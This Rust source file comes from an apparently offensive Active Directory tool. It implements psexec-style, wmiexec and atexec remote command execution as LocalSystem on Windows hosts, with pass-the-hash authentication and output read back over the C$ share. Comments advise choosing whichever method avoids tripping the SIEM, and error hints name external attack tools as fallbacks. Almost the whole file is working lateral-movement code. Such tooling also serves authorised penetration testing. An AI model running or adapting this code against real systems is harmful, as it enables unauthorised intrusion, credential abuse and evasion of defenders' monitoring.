//! Remote command execution family sharing `ExecArgs`:
//! - `exec` — SVCCTL LocalSystem service (psexec-style) — **1.4.8-B WS-PSEXEC**.
//!   Create + start + delete a LocalSystem service running the command via
//!   `dcerpc::svcctl::exec`. Loudest of the three (Event ID 7045 = service install).
//! - `wmiexec` — DCOM `Win32_Process.Create` with C$ output capture —
//!   **1.4.8-F WS-WMIEXEC** (moved from SEALED-BLOCKED after this pass discovered
//!   the existing `dcerpc::dcom_wmi::wmi_exec` already works without needing the
//!   cut WS-4-P2 sealed-RPC path). Detached process under WmiPrvSE; output
//!   redirected to a temp file on C$ and poll-read back over SMB. Quieter than
//!   `exec` (no service telemetry).
//! - `atexec` — MS-TSCH scheduled task under LocalSystem — **1.4.8-B WS-ATEXEC**.
//!   Register + run + delete a task via `dcerpc::tsch::atexec`; output captured
//!   the same way as `wmiexec`. Different telemetry surface again (Task
//!   Scheduler operational log).
//!
//! Three different host-side telemetry footprints; pick whichever isn't tripping
//! the SIEM. All three support pass-the-hash via `--nt-hash`.

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct ExecArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::SmbAuth,
    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
    #[arg(long)]
    pub nt_hash: Option<adhammer_core::SecretString>,
    /// Command to run (executed as `cmd.exe /Q /c <command>` under LocalSystem)
    #[arg(long)]
    pub command: String,
}

/// Remote code execution over SVCCTL: create a LocalSystem service running the command, start
/// it, delete it. Blind (no output) — pair with a listener or redirect to a share for results.
pub(crate) async fn exec_cmd(mut a: ExecArgs) -> Result<()> {
    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
    use smb2_client::SmbClient;
    let mut smb = SmbClient::connect(&a.auth.host).await?;
    crate::smb_login(
        &mut smb,
        &a.auth.host,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
        .await?;
    let r = dcerpc::svcctl::exec(&mut smb, &a.auth.host, &a.command).await?;
    let clean = if r.cleaned {
        "service cleaned up"
    } else {
        "SERVICE NOT DELETED"
    };
    if r.ran {
        println!(
            "[+] executed as LocalSystem (service '{}', start win32 {}); {clean}",
            r.service, r.start_win32
        );
    } else {
        println!("[-] service '{}' created but start returned win32 {} (command may not have run); {clean}", r.service, r.start_win32);
    }
    match r.output {
        Some(o) if !o.is_empty() => println!("\n{o}"),
        Some(_) => println!("[*] command produced no output"),
        None => println!("[*] output not captured (see warnings; command may still have run)"),
    }
    Ok(())
}

/// wmiexec: remote code execution over WMI (DCOM `Win32_Process.Create`). The process runs detached
/// under WmiPrvSE, so the command is redirected to a temp file and read back over C$ — no service or
/// scheduled task is created (distinct host telemetry from `exec`/`atexec`).
pub(crate) async fn wmiexec_cmd(mut a: ExecArgs) -> Result<()> {
    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
    use smb2_client::SmbClient;
    let hash = a.nt_hash.as_deref().map(crate::parse_nt_hash).transpose()?;
    anyhow::ensure!(
        !a.auth.password.is_empty() || hash.is_some(),
        "provide --password or --nt-hash"
    );
    // Unique output path under C:\Windows\Temp, redirected inside a cmd wrapper.
    let tag = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
        & 0xff_ffff;
    let out_rel = format!("Windows\\Temp\\ADHwmi{tag:06x}.out");
    let out_abs = format!("C:\\{out_rel}");
    let wrapped = format!("cmd.exe /Q /c {} > {out_abs} 2>&1", a.command);

    let hr = dcerpc::dcom_wmi::wmi_exec(
        &a.auth.host,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        hash.as_ref(),
        "ADHAMMER",
        &wrapped,
    )
    .await?;
    if hr != 0 {
        crate::ui::warn(&format!(
            "Win32_Process.Create returned HRESULT 0x{:08x} (command may not have run)",
            hr as u32
        ));
    } else {
        crate::ui::ok("process created via WMI (Win32_Process.Create)");
    }

    // The process is detached — poll-read the output file over C$ until it lands.
    let mut smb = SmbClient::connect(&a.auth.host).await?;
    crate::smb_login(
        &mut smb,
        &a.auth.host,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\C$", a.auth.host))
        .await?;
    // Stream 3 / A.3: exponential backoff (500 → 2000ms, 6 attempts, ~8.4s
    // total). WMI Win32_Process.Create returns before the child has flushed
    // its stdout to the redirected file — the previous fixed 300ms cadence
    // raced heavy commands (`net group`, `whoami /all`) and reported "output
    // not captured" while the file appeared moments later. Backoff gives slow
    // hosts room to breathe without stretching the fast-path wait.
    let mut out = None;
    let mut last_err: Option<String> = None;
    // `--fast` tightens the read-back cadence (~2.1s worst case vs ~7.6s); it
    // still retries so we don't report "output not captured" while the child is
    // mid-flush. The default schedule stays gentle for slow/loaded hosts.
    let schedule: &[u64] = if adhammer_core::speed::is_native() {
        &[100, 200, 300, 400, 500, 600]
    } else {
        &[500, 700, 1000, 1400, 2000, 2000]
    };
    for &delay_ms in schedule {
        match smb.read_file_delete(&out_rel).await {
            Ok(b) => {
                out = Some(b);
                break;
            }
            Err(e) => {
                last_err = Some(e.to_string());
                tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
            }
        }
    }
    match out {
        Some(b) if !b.is_empty() => {
            let s = String::from_utf8_lossy(&b);
            println!("\n{}", s.trim_end());
        }
        Some(_) => crate::ui::info("command produced no output"),
        None => {
            crate::ui::info("output not captured (command may still have run)");
            if let Some(err) = last_err {
                eprintln!("[hint] last C$ read error: {err}");
            }
            eprintln!(
                "[hint] manual retrieval: `smbclient //{h}/C$ -c 'get {p}' -U {d}/{u}%<pw>` \
                 (Windows/WmiPrvSE sometimes flushes >8s after Win32_Process.Create returns)",
                h = a.auth.host,
                p = out_rel.replace('\\', "/"),
                d = a.auth.domain,
                u = a.auth.user,
            );
        }
    }
    Ok(())
}

/// atexec: remote code execution as LocalSystem via a scheduled task (MS-TSCH), with output
/// captured over C$. Alternative to `exec` (SVCCTL) — different host telemetry.
pub(crate) async fn atexec_cmd(mut a: ExecArgs) -> Result<()> {
    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
    use smb2_client::SmbClient;
    let mut smb = SmbClient::connect(&a.auth.host).await?;
    crate::smb_login(
        &mut smb,
        &a.auth.host,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.nt_hash,
    )
    .await?;

    let tag = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0);
    let out_rel = format!("Windows\\Temp\\ADhat{tag:08x}.out");
    let full = format!("{} > C:\\{out_rel} 2>&1", a.command);

    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
        .await?;
    let (path, run_hr) = match dcerpc::tsch::atexec(
        &mut smb,
        &full,
        &a.auth.domain,
        &a.auth.user,
        &a.auth.password,
        &a.auth.host,
    )
    .await
    {
        Ok(v) => v,
        Err(e) => {
            // 1.5.2 Task S: MS-TSCH sealed-RPC empty-auth_value fault reproduced
            // on 2022 DCs; classify + emit the standard impacket-atexec fallback
            // so the CLI carries the operator through until the kerbcore-swap +
            // sealed-response fix lands.
            let msg = e.to_string();
            let looks_sealed = msg.contains("sealed response")
                || msg.contains("empty auth_value")
                || msg.contains("STATUS_PIPE_BUSY")
                || msg.contains("0xc00000ae");
            if looks_sealed {
                eprintln!("[!] MS-TSCH sealed-RPC fault: {msg}");
                eprintln!(
                    "[hint] this step is a known adhammer gap: sealed-response \
                     auth_value handling on the SchRpcRun path; unblocked by the \
                     kerbcore swap tracked at [[project-kerbcore]]."
                );
                eprintln!(
                    "[hint] external tool: impacket-atexec {d}/{u}@{h} '{c}'",
                    d = a.auth.domain,
                    u = a.auth.user,
                    h = a.auth.host,
                    c = a.command
                );
                eprintln!("[hint] see docs/GAPS.md#psexec-sealed for the full row");
            }
            return Err(e.into());
        }
    };
    println!("[+] scheduled task {path} registered + run as LocalSystem (run HRESULT 0x{run_hr:08x}); deleted");

    smb.tree_connect(&format!("\\\\{}\\C$", a.auth.host))
        .await?;
    match smb.read_file_delete(&out_rel).await {
        Ok(b) if !b.is_empty() => println!(
            "\n{}",
            String::from_utf8_lossy(&b).replace('\r', "").trim_end()
        ),
        Ok(_) => println!("[*] command produced no output"),
        Err(e) => println!("[*] output not captured: {e}"),
    }
    Ok(())
}
